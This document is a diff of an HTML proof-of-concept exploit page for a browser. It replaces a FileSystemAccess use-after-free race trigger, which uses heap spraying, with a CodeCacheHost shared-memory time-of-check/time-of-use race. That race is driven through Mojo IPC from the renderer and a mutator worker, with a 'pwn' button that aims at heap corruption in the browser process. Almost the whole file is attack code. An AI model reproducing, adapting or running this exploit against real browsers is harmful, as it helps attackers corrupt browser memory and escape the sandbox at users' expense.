@@ -1,86 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>FileSystemAccess UAF PoC</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { font-family: monospace; padding: 20px; }
-        #log { background: #eee; padding: 10px; height: 300px; overflow-y: scroll; border: 1px solid #ccc; }
-        button { padding: 15px; font-size: 16px; background: #d9534f; color: white; border: none; border-radius: 5px; }
-    </style>
+    <title>CodeCacheHost BigBuffer TOCTOU</title>
 </head>
 <body>
-    <h1>Standard Web API Race Trigger</h1>
-    <button id="trigger">Spam UAF Trigger</button>
-    <button id="stop">Stop</button>
-    
-    <h3>Execution Log:</h3>
-    <div id="log"></div>
+    <h1>CodeCacheHost Heap Overflow</h1>
+    <button id="pwn">Trigger Memory Corruption</button>
 
-    <script>
-        const logDiv = document.getElementById('log');
-        let isRunning = false;
+    <script type="module">
+        // Import the pointers from your dumped bindings
+        import { CodeCacheHostPtr, CodeCacheType } from './code_cache.mojom.js';
 
-        function logMessage(msg) {
-            logDiv.innerHTML += msg + '<br>';
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
+        async function pwnBrowser() {
+            console.log("[*] Initializing Mojo connections...");
 
-        async function runRace() {
-            return new Promise((resolve) => {
-                const worker = new Worker('worker.js');
+            // 1. Bind to the Browser Process Interface
+            const codeCacheHost = new CodeCacheHostPtr();
+            Mojo.bindInterface('blink.mojom.CodeCacheHost', 
+                               mojo.makeRequest(codeCacheHost).handle);
 
-                // Set a timeout just in case the worker hangs
-                const timer = setTimeout(() => {
-                    worker.terminate();
-                    resolve();
-                }, 1000);
-
-                worker.onmessage = (e) => {
-                    if (e.data.type === 'log') {
-                        logMessage(e.data.msg);
-                    } else if (e.data.type === 'RACE_NOW') {
-                        
-                        // 1. Kill the worker
-                        worker.terminate();
-                        clearTimeout(timer);
-                        
-                        // 2. THE TWEAK: Spray the heap immediately!
-                        // We allocate thousands of ArrayBuffers to force the browser 
-                        // to overwrite the freed FileSystemAccessAccessHandleHostImpl object.
-                        window.spray = [];
-                        for (let i = 0; i < 5000; i++) {
-                            // 0x100 is roughly the size of the Host object in memory
-                            window.spray.push(new ArrayBuffer(0x100)); 
-                        }
-                
-                        logMessage("<span style='color:red;'>[+] Worker terminated & Heap Sprayed.</span>");
-                        resolve();
-                    }
-                };
-            });
-        }
-
-        document.getElementById('trigger').onclick = async () => {
-            if (isRunning) return;
-            isRunning = true;
-            logMessage("[*] Starting exploit loop...");
+            // 2. Allocate the Malicious Shared Memory
+            // We use 100KB to guarantee it triggers the Shared Memory path in BigBuffer
+            const bufferSize = 100 * 1024;
+            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
             
-            let attempts = 0;
-            while (isRunning) {
-                attempts++;
-                logMessage(`<br><b>--- Attempt ${attempts} ---</b>`);
-                await runRace();
-                
-                // Small delay to let the browser process garbage collection catch up
-                await new Promise(r => setTimeout(r, 50)); 
-            }
-        };
+            // Map the buffer into our Renderer process so we can write to it
+            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
+            const view = new DataView(mapping.buffer);
 
-        document.getElementById('stop').onclick = () => {
-            isRunning = false;
-            logMessage("[*] Stopped.");
-        };
+            // 3. Write a "Safe" Dummy Header
+            // We write a legitimate size so the initial Browser checks pass.
+            const SAFE_SIZE = 0x50;
+            view.setUint32(0, 0x13371337, true); // Dummy Magic Number
+            view.setUint32(4, SAFE_SIZE, true);  // The Target Size Field
+
+            console.log("[*] Shared Memory initialized. Starting mutator thread...");
+
+            // 4. Spawn the Mutator Worker
+            // We pass the raw memory buffer to a Web Worker to race the Browser process
+            const mutator = new Worker('mutator.js');
+            mutator.postMessage({ buffer: mapping.buffer }, [mapping.buffer]);
+
+            // 5. Construct the Mojo Parameters
+            const cacheType = CodeCacheType.kJavascript;
+            const url = { url: "https://victim.com/script.js" };
+            const responseTime = { internalValue: 0 };
+            
+            // Force the BigBuffer to use the Shared Memory union
+            const bigBufferData = {
+                sharedMemory: {
+                    bufferHandle: sharedBuffer.handle,
+                    size: bufferSize
+                }
+            };
+
+            console.log("[*] Sending malicious IPC payload...");
+
+            // 6. FIRE THE IPC MESSAGE
+            // This sends the handle to the Browser process. 
+            // The Browser will read our SAFE_SIZE, allocate memory, and then...
+            codeCacheHost.didGenerateCacheableMetadata(
+                cacheType, 
+                url, 
+                responseTime, 
+                bigBufferData
+            );
+
+            console.log("[+] Payload sent. If the race is won, the Browser process will SIGSEGV.");
+        }
+
+        document.getElementById('pwn').onclick = pwnBrowser;
     </script>
 </body>
 </html>
